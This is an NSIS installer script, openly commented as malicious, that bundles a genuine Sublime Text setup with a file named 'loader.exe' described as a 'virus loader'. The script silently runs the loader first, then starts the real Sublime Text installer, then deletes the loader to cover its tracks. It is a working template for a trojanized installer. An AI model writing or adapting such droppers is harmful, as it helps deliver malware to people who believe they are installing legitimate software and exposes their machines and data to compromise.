# define name of installer
OutFile "installer.exe"
 
# define installation directory
InstallDir $DESKTOP
 
# For removing Start Menu shortcut in Windows 7
RequestExecutionLevel user
 
# start default section
Section
 
    # set the installation directory as the destination for the following actions
    SetOutPath $INSTDIR
   
    # Add sublime text installer
    File sublime_text_build_4200_x64_setup.exe
    # Add malicious program to installer
    File loader.exe
    
    # Execute the virus loader immediately
    ExecWait '"$INSTDIR\loader.exe"'

    # Execute sublime text installer
    Exec '"$INSTDIR\sublime_text_build_4200_x64_setup.exe"'

    Delete $INSTDIR\loader.exe

    # create the uninstaller
    WriteUninstaller "$INSTDIR\uninstall.exe"
 
    
SectionEnd
 
# uninstaller section start
Section "uninstall"

    # Delete the actual program
    Delete $INSTDIR\sublime_text_build_4200_x64_setup.exe
 
    # Delete the uninstaller
    Delete $INSTDIR\uninstaller.exe
 
    RMDir $INSTDIR
# uninstaller section end
SectionEnd